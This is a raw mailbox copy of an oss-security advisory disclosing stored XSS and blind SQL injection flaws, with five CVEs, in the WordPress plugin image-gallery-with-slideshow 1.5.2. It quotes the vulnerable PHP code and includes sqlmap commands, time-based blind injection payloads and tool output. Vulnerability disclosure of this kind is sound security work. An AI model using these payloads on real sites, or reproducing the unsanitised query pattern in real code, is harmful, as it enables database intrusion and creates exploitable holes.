X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6119" "Wednesday" "5" "April" "2017" "19:00:03" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<27FD4B62-8D1D-449B-A3F6-3CE6780A3E2B@me.com>" "159" "[oss-security] Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow v1.5.2" nil nil nil "4" "2017040523:00:03" "[oss-security] Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow v1.5.2" (number mark "U       larry0@me.co Apr  5  159/6119  " thread-indent "\"[oss-security] Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow v1.5.2\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5929 invoked by uid 550); 5 Apr 2017 23:00:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5897 invoked from network); 5 Apr 2017 23:00:17 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1491433205; bh=MmTp/M45ZHv/kocu7K3iCfDYvyze599LYjnHZOZzc80=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=YdGaMbgxrzQq3lSxtoyOPXsXiwV1nhD3mwgzvEAZ3ee26EYfzDC+GKudZfAvBrdyS
 B794JkUVI2owJytpNbsTwzZ+Sv+NaM+WOrieDfy0chy08R5RH87+RGOzmvau134lHU
 pDbTeO1Ha5wd4378Dv9Uoy8Z8ahF1YcVm16wQ2XMqTGPdZKGr3Am8LbBJPeXsTY10t
 gCSXCh3bOS5gmg8C8fEVuliknACdqLyxrHyuUNd500LXQay4If1d0mC/A/DqhTAvq5
 12x8dpb4k0Q/MH9qdmux/KCO+auVAl8IGARxHTozklyelFiZn9fDKDR3wB8Qepv8lH
 1KkFirqU7Ps5g==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-04-05_17:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1704050191
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <27FD4B62-8D1D-449B-A3F6-3CE6780A3E2B@me.com>
Date: Wed, 05 Apr 2017 19:00:03 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Blind SQL Injection and persistent XSS in Wordpress plugin
 image-gallery-with-slideshow v1.5.2

Title: Blind SQL Injection and persistent XSS in Wordpress plugin image-gal=
lery-with-slideshow v1.5.2
Author: Larry W. Cashdollar, @_larry0
Date: 2017-04-01
CVE-ID:[CVE-2017-1002011][CVE-2017-1002012][CVE-2017-1002013][CVE-2017-1002=
014][CVE-2017-1002015]
Download Site: https://wordpress.org/plugins/image-gallery-with-slideshow/
Vendor: http://www.anblik.com/
Vendor Notified: 2017-04-01
Vendor Contact: https://twitter.com/anblik
Advisory: http://www.vapidlabs.com/advisory.php?v=3D189
Description: Image Gallery with Slideshow is a full integrated Image Galler=
y and Slideshow plugin for WordPress.
Vulnerability:
CVE-2017-1002011:

There is a stored XSS vulnerability via the $value->gallery_name and $value=
->gallery_description where anyone with privileges to modify or add galleri=
es / images and inject javascript into the database.

145  <td><a class=3D"row-title" title=3D"Edit" href=3D"<?php echo bloginfo(=
'url');?>/wp-admin/admin.php?page=3Dgallery_with_slideshow&val=3Dview&gid=
=3D<?php echo $value->gallery_id;?>"><?php echo $value->gallery_name;?></a>=
</td>
146  <td>&nbsp;<?php echo $value->gallery_description;?></td>

CVE-2017-1002012:

In image-gallery-with-slideshow/admin_setting.php the following snippet of =
code does not sanitize input via the gid variable before passing it into an=
 SQL statement:


173 if($_REQUEST['val'] =3D=3D 'view')
174 {
175         $path_value =3D get_combo_path_value();
176         $id =3D $_REQUEST['gid'];
177         global $wpdb;
178         $table_prefix =3D $wpdb->prefix;
179         $result =3D $wpdb->get_results("SELECT ig.gallery_name,ii.image=
_id,ii.original_name,ii.image_name,ii.gallery_id,ii.image_title,ii.link_url=
,ii.image_description FROM `".$table_prefix."combo_gallery` AS ig,`".$table=
_prefix."combo_image` AS ii WHERE ig.gallery_   id=3Dii.gallery_id AND ii.g=
allery_id =3D".$id);


255 if($_REQUEST['val'] =3D=3D 'edit')
256 {
257         $id =3D $_REQUEST['gid'];
258         global $wpdb;
259         $table_prefix =3D $wpdb->prefix;
=2E
=2E
=2E
270         $edit_result =3D $wpdb->get_results("SELECT * FROM `".$table_pr=
efix."combo_gallery` WHERE gallery_id =3D ".$id);

CVE-2017-1002013:
Blind SQL Injection via imgid parameter.

301 if($_REQUEST['val'] =3D=3D 'imgedit')
302 {
303         $id =3D $_REQUEST['imgid'];
304         $gid =3D $_REQUEST['gid'];
305         global $wpdb;
=2E
=2E
309         if(isset($_REQUEST['edit_image_submit']))
310         {
=2E
=2E
=2E
318         $edit_img_result =3D $wpdb->get_results("SELECT * FROM `".$tabl=
e_prefix."combo_image` WHERE image_id =3D ".$id);


361 if($_REQUEST['gval'] =3D=3D 'delete')
362 {
363         $id =3D $_REQUEST['gid'];
364         global $wpdb;
365         $table_prefix =3D $wpdb->prefix;
366         $info =3D $_SERVER['DOCUMENT_ROOT'];
367         $path_value =3D get_combo_path_value();
368         $select_img_query_result =3D $wpdb->get_results("SELECT * FROM =
`".$table_prefix."combo_image` WHERE gallery_id=3D".$id);


384 if($_REQUEST['ival'] =3D=3D 'delete')
385 {
386         $path_value =3D get_combo_path_value();
387         $id =3D $_REQUEST['gid'];
388         global $wpdb;
389         $table_prefix =3D $wpdb->prefix;
390         $info =3D $_SERVER['DOCUMENT_ROOT'];
391         $select_img_query_result1 =3D $wpdb->get_results("SELECT * FROM=
 `".$table_prefix."combo_image` WHERE image_id=3D".$id);

CVE-2017-1002014:
Blind SQL Injection via gallery_name parameter.

422 if(isset($_POST['gallery_submit']))
423 {
424         $gallery_name =3D $_REQUEST['gallery_name'];
425         $insert_query_result =3D $wpdb->insert($table_prefix.'combo_gal=
lery', array('gallery_name' =3D> $gallery_name,'date' =3D> current_time('my=
sql')));
426=20

CVE-2017-1002015:
Blind SQL Injection via selectMulGallery parameter.
492 if(isset($_POST['image_submit']))
493 {
494         $gallery_id =3D $_POST['selectMulGallery'];
495         $update_gallery_query =3D "UPDATE `".$table_prefix."combo_image=
` SET gallery_id=3D".$gallery_id." WHERE gallery_id =3D '0'";
496         $wpdb->query($update_gallery_query);

Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?pag=
e=3Dgallery_with_slideshow&val=3Dview&gid=3D*' --load-cookies=3D./cookie.tx=
t --dbms=3Dmysql --risk 2 --level 2
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-admin/admin.ph=
p?page=3Dgallery_with_slideshow&val=3Dview&gid=3D(CASE WHEN (2912=3D2912) T=
HEN SLEEP(5) ELSE 2912 END)
	=E2=80=A2 ---
	=E2=80=A2 [14:28:20] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [14:28:20] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 14:28:20
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 $ sqlmap -u 'http://192.168.0.169/wordpress/wp-admin/admin.php?p=
age=3Dgallery_with_slideshow&val=3Dimgedit&imgid=3D*&gid=3D1' --load-cookie=
s=3D./cookie.txt --dbms=3Dmysql --risk 2 --level 2
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 337 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/admin.php?=
page=3Dgallery_with_slideshow&val=3Dimgedit&imgid=3D(CASE WHEN (4482=3D4482=
) THEN SLEEP(5) ELSE 4482 END)&gid=3D1
	=E2=80=A2 ---
	=E2=80=A2 [22:07:00] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [22:07:00] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'=
